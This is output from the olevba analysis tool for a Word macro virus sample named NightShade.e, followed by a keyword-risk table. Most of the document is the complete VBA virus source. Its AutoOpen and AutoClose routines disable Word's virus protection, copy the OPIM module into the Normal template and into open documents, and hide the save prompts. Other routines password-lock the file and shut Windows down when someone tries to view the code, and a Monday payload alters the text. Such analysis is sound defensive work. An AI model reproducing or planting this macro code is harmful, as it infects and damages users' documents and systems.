olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NightShade.e-bdc2c30c44b8ecee84bd7c4d57967d6ffeb7d58d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NightShade.e-bdc2c30c44b8ecee84bd7c4d57967d6ffeb7d58d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO OPIM.bas 
in file: Virus.MSWord.NightShade.e-bdc2c30c44b8ecee84bd7c4d57967d6ffeb7d58d - OLE stream: 'Macros/VBA/OPIM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Infectous

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocumentInstalled = False
    GlobalInstalled = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "OPIM" Then
            DocumentInstalled = True
        End If
   Next
  
   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "OPIM" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="OPIM", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="OPIM", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
    End If

    Application.DisplayAlerts = wdAlertsAll

Infectous:
Call OPIM
End Sub

Sub AutoClose()
On Error GoTo Infectous

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocumentInstalled = False
    GlobalInstalled = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "OPIM" Then
            DocumentInstalled = True
        End If
    Next

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "OPIM" Then
            GlobalInstalled = True
        End If
    Next
    
     If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="OPIM", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
      
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="OPIM", Object:=wdOrganizerObjectProjectItems
   
        
    End If

    Application.DisplayAlerts = wdAlertsAll

Infectous:

End Sub
Sub ToolsMacro()

On Error GoTo Infectous

ActiveDocument.Password = "OPIM"
Documents.Close SaveChanges:=wdSaveChanges
Tasks.ExitWindows

Infectous:

End Sub
Sub Toolscustomize()
On Error GoTo Infectous

ActiveDocument.Password = "OPIM"
Documents.Close SaveChanges:=wdSaveChanges
Tasks.ExitWindows

Infectous:
End Sub
Sub ViewVBcode()
On Error GoTo Infectous

ActiveDocument.Password = "OPIM"
Documents.Close SaveChanges:=wdSaveChanges
Tasks.ExitWindows

Infectous:

End Sub
Sub OPIM()
On Error GoTo Infectous
If WeekDay(Now()) = 2 Then
Set myRange = ActiveDocument.Range(Start:=0, End:=0)
With myRange.Find
    .ClearFormatting
    .Text = "The"
    With .Replacement
        .ClearFormatting
        .Text = "Thee"
    End With
    .Execute Replace:=wdReplaceAll, Format:=True, MatchCase:=True, _
        MatchWholeWord:=True
End With
Set myRange = ActiveDocument.Range(Start:=0, End:=0)
With myRange.Find
    .ClearFormatting
    .Text = "the"
    With .Replacement
        .ClearFormatting
        .Text = "thee"
    End With
    .Execute Replace:=wdReplaceAll, Format:=True, MatchCase:=True, _
        MatchWholeWord:=True
End With
End If
Infectous:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

